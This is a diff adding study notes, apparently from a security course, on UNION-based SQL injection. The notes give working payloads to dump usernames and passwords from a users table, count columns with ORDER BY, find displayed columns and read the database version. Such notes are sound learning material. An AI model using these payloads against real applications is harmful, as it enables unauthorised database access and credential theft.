@@ -475,4 +475,131 @@ Final query:
 
 ✅ Login successful as admin.
 
+# 🔗 UNION Clause in SQL Injection
+
+The `UNION` keyword in SQL is used to combine the results of two or more `SELECT` statements into a single result.
+
+`SELECT * FROM ports UNION SELECT * FROM ships;`
+
+| code/Ship | city      |
+| --------- | --------- |
+| CN SHA    | Shanghai  |
+| SG SIN    | Singapore |
+| ZZ-21     | Shenzhen  |
+| Morrison  | New York  |
+
+**Note that the last table is `SELECT * FROM ships`!**
+
+
+
+**💉 UNION SQL Injection**
+
+You can use `UNION` in an injection to extract data from other tables.
+
+Suppose the original query is:
+
+`SELECT * FROM products WHERE product_id = 'user_input';`
+
+Inject:
+
+`' UNION SELECT username, password FROM users--`
+
+Final query becomes:
+
+<pre>SELECT * FROM products WHERE product_id = '1' 
+UNION 
+SELECT username, password FROM users--</pre> 
+
+✅ Now you can dump usernames and passwords, assuming both queries return 2 columns.
+
+**🧱 What If the Columns Don’t Match?**
+
+If your target query has more columns, but you only want 1 or 2 values (like username), you need to fill the rest with junk or placeholder data (e.g., numbers or NULL).
+
+Example: The Original table has 4 columns.
+
+You inject:
+
+`' UNION SELECT username, 2, 3, 4 FROM users--`
+
+Result:
+
+| Col1  | Col2 | Col3 | Col4 |
+| ----- | ---- | ---- | ---- |
+| admin | 2    | 3    | 4    |
+
+
+✅ You got the username, and filled the rest with dummy values.
+
+**💡 Tips**
+
+Use NULL as placeholder—it works with any data type:
+
+`UNION SELECT username, NULL, NULL, NULL FROM users--`
+
+Using numbers helps track column positions and debug your injection.
+
+
+# Union Injection
+
+
+**🔢 Step 1: Find the Number of Columns**
+
+Before we can use UNION, we need to know how many columns the original query is using.
+
+**✅ Method 1: ORDER BY**
+
+Try injecting:
+
+`' ORDER BY 1-- -`
+
+Keep increasing the number:
+
+`' ORDER BY 2-- -`
+`' ORDER BY 3-- -`
+`' ORDER BY 4-- -`
+`' ORDER BY 5-- -`
+
+Once you get an error, you’ve gone too far. For example:
+
+If `ORDER BY 4` works and `ORDER BY 5` gives an error, then there are 4 columns.
+
+**✅ Method 2: UNION SELECT**
+
+Try injecting:
+
+`cn' UNION SELECT 1,2,3-- -`
+
+If it gives an error, increase the number of values:
+
+`cn' UNION SELECT 1,2,3,4-- -`
+
+If this works and returns results, then there are 4 columns.
+
+**🎯 Step 2: Find Which Columns Are Displayed**
+
+Sometimes, not all columns from the query are shown on the page. To find out which columns are printed, inject numbers and look at which ones appear in the output.
+
+Example:
+
+`cn' UNION SELECT 1,2,3,4-- -`
+
+If you see only 2, 3, and 4 on the page, it means:
+
+- Column 1 is not printed
+- Columns 2–4 are printed
+
+So, to show your own data, place it in one of the printed columns.
+
+**🧪 Step 3: Test with Real Data**
+
+Now replace one of the numbers with real SQL data, like the database version:
+
+`cn' UNION SELECT 1,@@version,3,4-- -`
+
+If you see something like `10.3.22-MariaDB`, it means:
+
+✅ Your injection is working, and you're able to extract data.
+
+
 
